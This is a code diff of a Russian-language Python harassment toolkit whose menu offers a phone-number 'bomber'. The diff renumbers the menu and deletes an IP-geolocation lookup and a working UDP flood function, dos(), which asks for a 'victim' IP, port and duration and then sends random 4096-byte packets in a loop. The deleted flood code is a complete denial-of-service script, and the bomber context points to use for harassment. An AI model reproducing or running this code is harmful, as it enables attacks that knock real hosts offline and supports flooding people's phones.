@@ -78,10 +78,10 @@ def clear():
 
 	
 def banner_tools():
-	print(colored("[1]", "red"), colored("bomber", "magenta"))
-	print(colored("[2]", "red"), colored("FAQ Про прокси", "magenta"))
-	print(colored("[3]", "red"), colored("краткое руководство проблем", "magenta"))
-	print(colored("[4]", "red"), colored("отказ от ответственности", "magenta"))
+	print(colored("1.", "red"), colored("bomber", "magenta"))
+	print(colored("2.", "red"), colored("FAQ Про прокси", "magenta"))
+	print(colored("3.", "red"), colored("краткое руководство проблем", "magenta"))
+	print(colored("4.", "red"), colored("отказ от ответственности", "magenta"))
 
 	print(colored("\n[99]", "red"), colored("информация", "cyan"))
 	print(colored("\n[0] выход", "red"))
@@ -618,138 +618,4 @@ def start(number, country, proxy_=None):
 				return
 			return
 
-
-def ip():
-	clear()
-	global response
-	print(colored("Введите айпи, если хотите пробить свой айпи, ничего не вводите", "red"))
-	ip = input(colored(">>> ", "red"))
-	if ip == '':
-		try:
-			response = requests.get('https://ipinfo.io/json')
-		except:
-			print(colored("Произошла ошибка", "red"))
-			print('----------')
-			main()
-	else:
-		try:
-			response = requests.get('https://ipinfo.io/' + ip + '/json')
-		except:
-			print(colored("Произошла ошибка", "red"))
-			print(colored("----------", "red"))
-			main()
-	r = response.json()
-	try:
-		clear()
-		try:
-			print('[IP] : ' + r['ip'])
-		except:
-			pass
-		try:
-			print('[Страна] : ' + r['country'])
-		except:
-			pass
-		try:
-			print('[Регион] : ' + r['region'])
-		except:
-			pass
-		try:
-			print('[Город] : ' + r['city'])
-		except:
-			pass
-		try:
-			print('[Имя устройства] : ' + r['hostname'])
-		except:
-			pass
-		try:
-			print('[Местоположение] : ' + r['loc'])
-		except:
-			pass
-		try:
-			print('[Провайдер] : ' + r['org'])
-		except:
-			pass
-		try:
-			print('[Часовой пояс] : ' + r['timezone'])
-		except:
-			pass
-		try:
-			print('[Почтовый индекс] : ' +  r['postal'])
-		except:
-			pass
-		print("\nНажмите Enter чтобы вернуть назад")
-		try:
-			input()
-		except KeyboardInterrupt:
-			return
-		return
-	except:
-		print(colored("Произошла ошибка", "red"))
-	print(colored("----------", "red"))
-	main()
-	print("\nНажмите Enter чтобы вернуть назад")
-	input()
-
-
-def dos():
-	clear()
-	print(colored("Введите айпи жертвы ,если хотите использовать свой айпи, ничего не вводите", "red"))
-	ip = input(colored(">>> ", "red"))
-	if ip == '':
-		ip = '127.0.0.1'
-	print(colored("Введите порт жертвы", "red"))
-	try:
-		port = int(input('>>> '))
-	except:
-		print(colored("Произошла ошибка", "red"))
-		print(colored("----------", "red"))
-		main()
-		print("\nНажмите Enter чтобы вернуть назад")
-		try:
-			input()
-		except KeyboardInterrupt:
-			return
-		return
-
-	clear()
-
-	print(colored("Введите время атаки в секундах", "red"))
-	try:
-		duration = int(input('>>> '))
-	except:
-		print(colored("Произошла ошибка", "red"))
-		print(colored("----------", "red"))
-		main()
-	try:
-		client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	except:
-		print(colored("Произошла ошибка", "red"))
-	packages_sent = 0
-	bytes = random._urandom(4096)
-	timeout = time.time() + duration
-	try:
-		while True:
-			if time.time() > timeout:
-				break
-			try:
-				client.sendto(bytes, (ip, port))
-			except socket.gaierror:
-				print(colored("Произошла ошибка", "red"))
-				break
-			packages_sent += 1
-			print(f'Отправлено {packages_sent} пакетов на {ip}:{port}. Для преждевременного выхода нажмите ctrl+c.')
-	except KeyboardInterrupt:
-		print(colored("\nЗавершение атаки...", "red"))
-		time.sleep(.3)
-		print(colored("----------", "red"))
-		main()
-		print("\nНажмите Enter чтобы вернуть назад")
-		try:
-			input()
-		except KeyboardInterrupt:
-			return
-		return
-
-	print(colored("----------", "red"))
-	main()
 
